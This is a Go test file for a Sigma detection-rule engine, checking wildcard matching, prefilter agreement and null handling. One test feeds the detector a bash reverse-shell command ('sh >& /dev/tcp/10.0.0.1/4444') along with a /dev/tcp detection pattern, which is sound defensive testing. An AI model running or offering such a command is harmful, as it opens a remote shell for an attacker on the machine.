package sigma

import (
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/event"
)

// TestWildcards is the A6 regression: Sigma `*`/`?` in an unmodified value are
// wildcards, not literals. Before the fix they were matched literally, so a
// SigmaHQ rule like `CommandLine: '*whoami*'` silently never fired.
func TestWildcards(t *testing.T) {
	cases := []struct {
		name  string
		value string // the rule's CommandLine value
		cmd   string // the event's CommandLine
		want  bool
	}{
		{"star both sides = contains", "*whoami*", "sh -c whoami", true},
		{"star contains, absent", "*whoami*", "sh -c id", false},
		{"trailing star = startswith", "sudo *", "sudo -i", true},
		{"trailing star, not prefix", "sudo *", "x sudo", false},
		{"leading star = endswith", "*/python3", "/usr/bin/python3", true},
		{"leading star, not suffix", "*/python3", "/usr/bin/python3 -c x", false},
		{"question = one char", "f?o", "fXo", true},
		{"question not zero", "f?o", "fo", false},
		{"question not two", "f?o", "fXXo", false},
		{"no wildcard = equals (anchored)", "exactcmd", "exactcmd", true},
		{"no wildcard not substring", "exactcmd", "exactcmd --flag", false},
		{"escaped star is literal", `a\*b`, "a*b", true},
		{"escaped star not wildcard", `a\*b`, "axb", false},
		{"case-insensitive", "*WHOAMI*", "run whoami now", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r, err := Compile([]byte("detection:\n  s:\n    CommandLine: " + quote(tc.value) + "\n  condition: s\n"))
			if err != nil {
				t.Fatalf("Compile: %v", err)
			}
			got := r.Match(event.Event{CommandLine: tc.cmd})
			if got != tc.want {
				t.Errorf("value %q vs %q: got %v, want %v", tc.value, tc.cmd, got, tc.want)
			}
		})
	}
}

// TestWildcardMatcherEquivalence confirms the prefilter still agrees with the
// authoritative Match for a wildcard rule (a wildcard compiles to a regexp,
// which the prefilter treats as always-candidate -- sound).
func TestWildcardMatcherEquivalence(t *testing.T) {
	r := compileOK(t, "detection:\n  s:\n    CommandLine: '*/dev/tcp/*'\n  condition: s\n")
	r.Name = "wild"
	m := NewMatcher([]*Rule{r})
	for _, cmd := range []string{"bash -c 'sh >& /dev/tcp/10.0.0.1/4444'", "nothing here", ""} {
		ev := event.Event{CommandLine: cmd}
		want := r.Match(ev)
		got := len(m.Match(ev)) > 0
		if want != got {
			t.Errorf("cmd %q: Match=%v matcher=%v", cmd, want, got)
		}
	}
}

// TestNullInValueListRejected: a null is only meaningful as a bare
// `field: null` absence test (see null_test.go). A null buried in a value list
// has no defined comparison meaning and would be a silently-dead leaf, so it is
// still a load error.
func TestNullInValueListRejected(t *testing.T) {
	_, err := Compile([]byte("detection:\n  s:\n    Image: [foo, null]\n  condition: s\n"))
	if err == nil {
		t.Fatal("expected a load error for a null inside a value list, got nil")
	}
	if !strings.Contains(err.Error(), "null") {
		t.Errorf("error should name the null value, got: %v", err)
	}
}

// quote single-quotes a YAML scalar, doubling embedded single quotes.
func quote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}
